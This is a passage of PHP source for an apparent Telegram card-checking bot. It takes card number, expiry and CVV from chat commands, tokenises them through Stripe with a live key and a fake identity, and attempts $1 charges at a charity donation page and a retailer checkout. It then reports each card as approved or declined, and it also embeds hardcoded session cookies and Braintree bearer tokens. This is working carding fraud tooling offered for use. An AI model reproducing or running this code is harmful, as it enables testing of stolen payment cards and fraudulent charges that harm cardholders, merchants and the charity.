  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-platform: "Android"',
    'accept-language: es-US,es;q=0.6',
    'referer: https://healthyfungi.com.au/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}

$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}

//sendPv($myid, $response);

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Braintree CCN_V3\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Pick up card - S') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Braintree CCN_V3\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Braintree CCN_V3\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
//    echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
//    echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}



elseif((strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)){
$lista = substr($message, 4);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$ano1  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
$ma = "$mes+%2F+$ano";

$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}                                                                                                    
if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !ch cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .ch cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
	die();
}
                                                                                                     
//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
	sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
	//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  //  CURLOPT_POSTFIELDS => 'type=card&billing_details%5Baddress%5D%5Bpostal_code%5D=37435&billing_details%5Baddress%5D%5Bcity%5D=Pearland&billing_details%5Baddress%5D%5Bcountry%5D=US&billing_details%5Baddress%5D%5Bline1%5D=543+w+belt+line+rd&billing_details%5Bemail%5D=poichad70%40rhyta.com&billing_details%5Bname%5D=Rigo++Perez&card%5Bnumber%5D=4169161444795073&card%5Bcvc%5D=588&card%5Bexp_month%5D=03&card%5Bexp_year%5D=29&guid=48a8dab2-9ea1-449d-8977-4278ae5f52b982b3ec&muid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f&sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=46867&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
  CURLOPT_POSTFIELDS => 'type=card&billing_details[address][postal_code]=37435&billing_details[address][city]=Pearland&billing_details[address][country]=US&billing_details[address][line1]=543+w+belt+line+rd&billing_details[email]=poichad70%40rhyta.com&billing_details[name]=Rigo++Perez&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=48a8dab2-9ea1-449d-8977-4278ae5f52b982b3ec&muid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f&sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd&payment_user_agent=stripe.js%2Ff22f608063%3B+stripe-js-v3%2Ff22f608063%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=46867&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'accept-language: es-US,es;q=0.9',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$id = $data['id'];

curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.charitywater.org/donate/stripe',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'country=us&payment_intent%5Bemail%5D=poichad70%40rhyta.com&payment_intent%5Bamount%5D=1&payment_intent%5Bcurrency%5D=usd&payment_intent%5Bpayment_method%5D='.$id.'&disable_existing_subscription_check=false&donation_form%5Bamount%5D=1&donation_form%5Bcomment%5D=&donation_form%5Bdisplay_name%5D=&donation_form%5Bemail%5D=poichad70%40rhyta.com&donation_form%5Bname%5D=Rigo+&donation_form%5Bpayment_gateway_token%5D=&donation_form%5Bpayment_monthly_subscription%5D=false&donation_form%5Bsurname%5D=Perez&donation_form%5Bcampaign_id%5D=a5826748-d59d-4f86-a042-1e4c030720d5&donation_form%5Bsetup_intent_id%5D=&donation_form%5Bsubscription_period%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_1%5D=543+w+belt+line+rd&donation_form%5Bmetadata%5D%5Baddress%5D%5Baddress_line_2%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcity%5D=Pearland&donation_form%5Bmetadata%5D%5Baddress%5D%5Bcountry%5D=&donation_form%5Bmetadata%5D%5Baddress%5D%5Bzip%5D=37435&donation_form%5Bmetadata%5D%5Bautomatically_subscribe_to_mailing_lists%5D=true&donation_form%5Bmetadata%5D%5Bfull_donate_page_url%5D=https%3A%2F%2Fwww.charitywater.org%2Fdonate%23&donation_form%5Bmetadata%5D%5Bphone_number%5D=&donation_form%5Bmetadata%5D%5Bplaid_account_id%5D=&donation_form%5Bmetadata%5D%5Bplaid_public_token%5D=&donation_form%5Bmetadata%5D%5Burl_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bsession_url_params%5D%5Btouch_type%5D=1&donation_form%5Bmetadata%5D%5Bwith_saved_payment%5D=false&donation_form%5Biho_attributes%5D%5Bamount_hidden%5D=false&donation_form%5Biho_attributes%5D%5Bdelivery_notification%5D=false&donation_form%5Biho_attributes%5D%5Bdesign%5D=in-memory-us&donation_form%5Biho_attributes%5D%5Bfrom_full_name%5D=&donation_form%5Biho_attributes%5D%5Bhonoree_full_name%5D=&donation_form%5Biho_attributes%5D%5Bmessage%5D=&donation_form%5Biho_attributes%5D%5Brecipient_email%5D=&donation_form%5Biho_attributes%5D%5Brecipient_full_name%5D=&donation_form%5Biho_attributes%5D%5Bsend_to%5D=honoree&donation_form%5Biho_attributes%5D%5Btype%5D=email',
  CURLOPT_COOKIE => 'countrypreference=US; optimizelyEndUserId=oeu1727042234870r0.9385499213586781; builderSessionId=a769ef11f27d4ab1b3a938966f28ac00; _gcl_au=1.1.1117950168.1727042237; _ga=GA1.1.1588880688.1727042240; FPAU=1.1.1117950168.1727042237; analytics_ids=iMG2SMEYVxANgwK3sG6DVJErN5AMZXhH8ZprCWg87gUKTXEY9Za1iAb7yUKp1QiXj8uLKdYCgwVt4x42mSLnty%2BqG454tNwaHxlW8bSGAwf7XRk6nzHkCcRMjK3%2FF0Hcx2tfvZGBVYDcG9QxI9LDBty%2BUrdNNhgH0vnmQ5VAo1Ky--HO%2FSMhnzu5mRDR3p--2E5N%2FNov5%2BSGZh126foarQ%3D%3D; __stripe_mid=3b57a29a-1fbe-43ff-a8bb-4d754aaa15b7bb924f; __stripe_sid=0ce9393a-ced4-4404-8c74-f694a45c525f7bdefd; _ga_5H0VND0XMD=GS1.1.1727042243.1.1.1727042676.0.0.1074196026; _ga_SKG6MDYX1T=GS1.1.1727042237.1.1.1727042719.0.0.694026822',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
//    'x-csrf-token: WeaTvtRa0ZL6skk_6DkEUGqjg6wp1bPyeAr8rNuQ_5KGioeVKhhuo7n--eqtWARWnaejjhSBdntJvIZLiNngiA',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept-language: es-US,es;q=0.9',
    'origin: https://www.charitywater.org',
    'referer: https://www.charitywater.org/donate',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$data = json_decode($response, true);
$respo = $data['error']['message'];
curl_close($curl);
	

///VERIFICA EL TINPO DE PROCESAMIENTO///
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";

if (empty($respo)) {
        $respo = $response;
}

// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR  ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($1)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}
	

elseif((strpos($message, "!par") === 0)||(strpos($message, "/par") === 0)||(strpos($message, ".par") === 0)){

$lista = substr($message, 5);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);


////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !par cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .par cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


$ip = mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255) . "." . mt_rand(0, 255);
//$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU4NTQyMDksImp0aSI6Ijg3NzNhMGEyLTlmZTktNDdmYy05OWE3LTNkNTdjNTI2MWM0MCIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.s5bPsNsIz0WmjwXw-ptkYCExzMzdpuQmLmxyzwyynXJ0B1_9rf4odlJ6BjUY7wuQT-bdM_NEl1HwEpS0ZhMZLw';
$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYwMzA3MDksImp0aSI6Ijk1NTkzNTI5LWM0YTgtNDIzZS04MDg5LWVlNTZmZGVhOGIwMCIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.lBhDMncAdSTQga3pbtebyZZt6o3o4n8X8b3X9MNmXYPakLR-NRJ2vkrL4HOUMR4AWjjTZ1asFVt9_eKVm8EEJw';
//$bear = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjYwMzEwNjUsImp0aSI6IjRmMzhiYmVlLTZlMTktNDgwZS1hZTQ0LTdkZjhkMjU4MDJiYyIsInN1YiI6Img5cmM5NjJ3eXZycjk3am4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Img5cmM5NjJ3eXZycjk3am4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYXBwYXJ0eXJhbWFjb3VrIn19.r6T7HyGG9LAx_W8t4_6bNyUk7U5Dv6zQQsWA8zVuo06nLmSiyyVUUtq7Th2nebQrmQ7DmcL75XkBICIVYjhjZQ';
////EXTRAE EL NONCE DEL CHECK
$curl = curl_init();

curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.partyrama.co.uk/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  //CURLOPT_COOKIE => '__kla_id=eyJlbWFpbCI6Impvam95MTc5NzBAb2Jpc2ltcy5jb20ifQ==; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_a54457280b903c6696cf9a36e4d4d7%7C%7C1725847493%7C%7C1725843893%7C%7Cb82249674b520797bcee1b0787ab4f14; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-08%2003%3A55%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-08%2003%3A55%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_items_in_cart=1; PHPSESSID=0c2154e0d2efb4153ffdd1480e34e042; woocommerce_cart_hash=1fa770d3bf1c17129a4be48933557e14; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_COOKIE => 'email-section=1; email-only='.$correo.'; email-section=1; delivery-instructions=; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-10%2004%3A54%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F128.0.0.0%20Mobile%20Safari%2F537.36; PHPSESSID=219e1f52d6422e534d2371ea41241d60; woocommerce_items_in_cart=1; wp_woocommerce_session_e8067bc7d3b30e6c6ba61052d27f1737=t_9ba71db98f8a23b83246b9a81f591d%7C%7C1726117014%7C%7C1726113414%7C%7C2b17f0d48a34b8bebab8126cfa97159f; __kla_id=eyJlbWFpbCI6InJpZ29qNzc3QGdtYWlsLmNvbSJ9; woocommerce_cart_hash=4958933f2dac9049a052d2576efb347b; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.partyrama.co.uk%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36',
